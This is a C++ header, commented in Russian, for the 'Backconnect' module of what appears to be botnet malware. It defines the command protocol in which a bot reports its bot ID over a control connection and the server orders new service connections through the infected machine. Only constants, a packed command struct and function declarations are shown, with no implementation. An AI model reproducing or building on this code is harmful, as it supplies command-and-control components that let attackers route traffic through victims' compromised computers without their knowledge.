/*
  Инструменты для Backconnect.
*/
#pragma once

namespace Backconnect
{
  //Некотрые константы.
  enum
  {
    SOCKET_TIMEOUT     = 30 * 1000,     //Таймаут для сокетов.
    KEEPALIVE_DELAY    = 5 * 60 * 1000, //Keepalive.
    KEEPALIVE_INTERVAL = 5 * 1000       //Интервал Keepalive в случаи ошибки.
  };
  
  //Команды для BCCOMMAND.
  enum
  {
    COMMAND_UNKNOWN,    //Ошибка.
    COMMAND_BOTID,      //Послыется ботом. Информация, после структуры находится строка размером
                        //wDataSize, несущая ID бота. Также сообшает, что данное соединение является
                        //управляющим.
    COMMAND_CONNECT,    //Послыается сервером. Создание нового соединения с bc сервером. Несет в
                        //себе DWORD как уникальный ID для соединения.
    COMMAND_IS_SERVICE, //Послыется ботом. Сообшает о том, что данное соединение является сервисным,
                        //несет в себе DWORD полученый от COMMAND_CONNECT.
  };

  #pragma pack(push, 1)
  typedef struct
  {
    WORD structSize; //sizeof(COMMAND)
    WORD dataSize;   //Размер данных идуших после структуры.
    BYTE command;    //Команда
  }COMMAND;
  #pragma pack(pop)
  
  /*
    Инициализация.
  */
  void init(void);

  /*
    Деинициализация.
  */
  void uninit(void);

  /*
    Чтение команды из сокета.

    IN s        - сокет.
    OUT command - структура для заполнения.
    OUT data    - буфер для данных, или NULL если данные не требуются. Буфер должен быть освобожден
                  через Mem.

    Return      - true  - в случаи успешного чтения команды.
                  false - в случаи оишбки.
  */
  bool _readCommand(SOCKET s, COMMAND *command, LPBYTE *data);

  /*
    Отправка команды на сокет.

    IN s        - сокет.
    IN command  - команда BCC_*.
    IN data     - данные.
    IN dataSize - размер данных.

    Return      - true - в случаи успеха,
                  false - в случаи ошибки.
  */
  bool _writeCommand(SOCKET s, BYTE command, const void *data, WORD dataSize);
};
